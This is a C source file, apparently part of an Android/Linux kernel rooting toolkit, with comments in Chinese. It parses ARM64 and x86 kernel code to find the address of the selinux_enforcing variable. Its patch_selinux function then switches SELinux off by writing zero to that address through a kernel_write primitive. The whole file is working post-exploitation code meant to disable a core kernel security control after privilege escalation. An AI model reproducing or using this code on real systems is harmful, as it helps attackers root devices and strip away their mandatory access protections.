#include <unistd.h>
#define _GNU_SOURCE             /* See feature_test_macros(7) */
#include <fcntl.h>              /* Obtain O_* constant definitions */
#include <unistd.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <stdbool.h>

#include "common.h"
#include "getroot.h"
#include "kallsym.h"
#include "selinux.h"


/*
 * 函数: analyze_selinux
 * 参数: kernelText, 二进制数组指针; start, 起始内核地址; offset, 存放钩子在结构体偏移
 * 返回: 钩子内核地址
 */
unsigned long analyze_selinux(unsigned char *kernelText, unsigned long start, unsigned int *offset)
{
	unsigned long ret = 0;
	unsigned int *insn_ptr, insn;
	unsigned int *adrp, *cmp, *beq;
	unsigned int adrp_imm = 0;
	int imm, shift;
	int reg1, reg2;
	unsigned long addr;
	unsigned low, high;

	adrp = cmp = beq = NULL;
	insn_ptr = (unsigned int*)kernelText;
	unsigned int adrpOffset = 0;
	while ((unsigned long)insn_ptr < (unsigned long)kernelText + 0x100) {
		insn = *insn_ptr;
		//printf("insn = 0x%08x \n", insn);
		if (((insn >> 24) & 0x9f) == 0x90) {
			// adrp
			//printf("get adrp \n");
			adrp = insn_ptr;
			adrpOffset = (unsigned long)insn_ptr - (unsigned long)kernelText;
		}
		else if ((insn >> 24) == 0xeb) {
			// cmp
			//printf("get cmp \n");
			cmp = insn_ptr;
			if (adrp != NULL) {
				break;
			}
		}
		insn_ptr++;
	}

	// adrp 
	insn_ptr = adrp;
	reg1 = (*adrp & 0x1f);
	low = (*adrp >> 29) & 0x3;
	high = (*adrp >> 5) & 0x7ffff;
	bool indirect = false;

	addr = ((unsigned long)((start + adrpOffset) & ~0xfff)) + (((high << 2) | low) << 12);
	//printf("adrp_imm = %x\n");

	while (insn_ptr < cmp) {
		insn = *insn_ptr;
		//printf("insn = 0x%08x \n", insn);

		if (((insn >> 24) & 0xff) == 0x91 && (insn & 0x3ff) == 0) {
			// add
			//printf("get adrp add \n");
			adrp_imm = insn >> 10 & 0xfff;
			//printf("adrp_add_imm = %x\n", adrp_imm);
		} else if(((insn >> 24) & 0xff) == 0x91 && (insn & 0x3ff)) {
			//printf("get add \n");
			adrp_imm = insn >> 10 & 0xfff;
			//printf("add_imm = %x\n", adrp_imm);
			*offset = adrp_imm;
		}

		insn_ptr++;
	}

	return addr + adrp_imm;
}

#ifdef CONFIG_ARCH_ARM64
/*
 * [arm64]
 */
unsigned long find_selinux_enforcing_by_comshic(void* text, int size, unsigned long kaddr)
{
	unsigned int *insn_ptr, insn;
	unsigned long start;
	unsigned int *adrp, *cmp, *beq;
	int imm, shift;
	int reg1, reg2;
	unsigned long addr;
	unsigned low, high;

	adrp = cmp = beq = NULL;
	start = kaddr;

	insn_ptr = (unsigned int *)text;
	unsigned int adrpOffset = 0;

	while ((unsigned long)insn_ptr < (unsigned long)text + size) {
		insn = *insn_ptr;
		//printf("insn = 0x%08x \n", insn);
		if (((insn >> 24) & 0x9f) == 0x90) {
			// adrp
			//printf("get adrp \n");
			adrp = insn_ptr;
			adrpOffset = (unsigned long)insn_ptr - (unsigned long)text;
		}
		else if ((insn >> 24) == 0x6b) {
			// cmp
			 //printf("get cmp \n");
			cmp = insn_ptr;
			if (adrp != NULL) {
				break;
			}
		}
		insn_ptr++;
	}

	// adrp 
	insn_ptr = adrp;
	reg1 = (*adrp & 0x1f);
	low = (*adrp >> 29) & 0x3;
	high = (*adrp >> 5) & 0x7ffff;
	bool indirect = false;

	addr = ((unsigned long)((start + adrpOffset) & ~0xfff)) + (((high << 2) | low) << 12);

	while (insn_ptr < cmp) {
		insn = *insn_ptr;
		 //printf("insn = 0x%08x \n", insn);
		reg2 = (insn >> 5) & 0x1f;
		if ((insn >> 22) == 0x3e5 && reg2 == reg1) {
			// ldr x0
			indirect = true;
			imm = ((insn >> 10) & 0xfff) * 8;
			addr += imm;
		}
		else if ((insn >> 22) == 0x2e5 && reg2 == reg1) {
			// ldr w0
			imm = ((insn >> 10) & 0xfff) * 4;
			addr += imm;

			if (!indirect) {
				//selinux_enforcing_address = addr;
				printf("    find selinux_enforcing_address = 0x%lx\n", addr);
				break;
			}
			else {
				//kernel_read_pan((char*)addr, (char*)&selinux_enforcing_address, sizeof(unsigned long));
				printf("    lookup selinux_enforcing_address = 0x%lx\n", addr);
				break;
			}

		}
		insn_ptr++;
	}

	return addr;
}

unsigned long find_selinux_enforcing_by_selre(void* text, int size, unsigned long kaddr)
{

	return 0;
}
#endif


#ifdef CONFIG_ARCH_X86_64
unsigned long find_selinux_enforcing_by_comshic(void* text, int size, unsigned long kaddr)
{

	return 0;
}


unsigned long find_selinux_enforcing_by_selre(void* text, int size, unsigned long kaddr)
{
	int i;
	unsigned char* chr_ptr = text;
	unsigned int*  int_ptr = NULL;
	unsigned long selinux_enforcing = 0;

	/* 解析内核代码找到 selinux_enforcing 地址 */
	for(i = 0; i < size; i++){
		//printf("    >>> %x\n", *chr_ptr);
		if((unsigned int)(*chr_ptr) == 0x8b){
			chr_ptr++;
			if((int)(*chr_ptr) == 0x0d){
				chr_ptr++;
				int_ptr = (unsigned int*)chr_ptr;
				selinux_enforcing = (unsigned long)(*int_ptr) + kaddr + i + 6;
				//printf("    0x%x, 0x%lx\n", *int_ptr, selinux_enforcing);
				break;
			}
		}
		chr_ptr++;
	}

	return selinux_enforcing;
}
#endif

/*
 * 函数: patch_selinux
 * 参数: kaddr, selinux_enforcing 变量的地址
 * 返回: 成功返回0，失败返回-1
 * 说明: 通过设置 selinux_enforcing = 0 来关闭selinux
 */
int patch_selinux(void *kaddr)
{
	int selinux_enforcing = 0;

	if (kaddr == NULL) {
		printf("    selinux_enforcing is NULL\n");
		return -1;
	}

	if (kernel_write(kaddr, &selinux_enforcing, sizeof(int)) < 0) {
		printf("    kernel_write fail\n");
		return -1;
	}

	return 0;
}

